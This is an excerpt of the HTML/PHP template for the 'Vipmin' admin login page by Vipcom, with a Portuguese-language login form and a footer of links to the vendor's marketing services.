                ...
                <div id="login-sub">
                    <div id="forms">
                        ...
                        <form id="login_form" action="loginpos.php" method="post" target="_top">
                            <div class="input-req-login"><label for="user">Login</label></div>
                            ...
                            <div class="input-field-login icon password-container">
                                <input name="password" id="password" placeholder="Digite a senha" value="" class="std_textbox" tabindex="2" required="" type="password" onkeypress="CheckEnter_admin(event);">
                            </div>
                            <div style="width: 285px;">
                                <div class="login-btn">
                                    <button name="login" onclick="javascript:entrar();" type="button" id="login_submit" tabindex="3">Entrar</button>
									<div class="divsenha" style="float: right; margin-left:32px;"> </div>
                                </div>
        ...
        <div style="display: block;" id="locale-footer">
            <div class="locale-container">
                ...
                <ul id="locales_list">
                        ...
                        <li><a target="_blank" href="http://www.vipcomsites.com.br/template-para-newsletter">Criação de Campanhas</a></li> 
                        
                        <li><a  target="_blank" href="http://www.vipcomsites.com.br/planos-de-marketing/arte-de-produtos-e-ofertas">Arte para Ofertas</a></li>
                    
                        
                        <li><a  target="_blank" href="http://www.vipcomsites.com.br/planos-de-marketing/criacao-de-logotipos">Logotipo</a></li>
                    
                        
                        <li><a  target="_blank" href="http://www.vipcomsites.com.br/planos-de-marketing/criacao-de-banners">Banners</a></li>
                    
                        
                        <li><a  target="_blank" href="http://www.vipcomsites.com.br/planos-de-marketing/personalizacao-de-facebook">Marketing Redes Sociais</a></li>
						
                        <li><a  target="_blank" href="http://www.vipcomsites.com.br/planos-de-marketing/producao-de-videos">Criação de Vídeos em HD</a></li>
...
<script>
    ...
    delete MESSAGES[""];
   	...
   	<? if($INI['option']['auth_setup']!="N"){?> <div class="copyright">O Vipmin foi projetado para navegadores Firefox e Google Chrome - Copyright © 2012 Vipcom, Inc.</div> <? } ?>
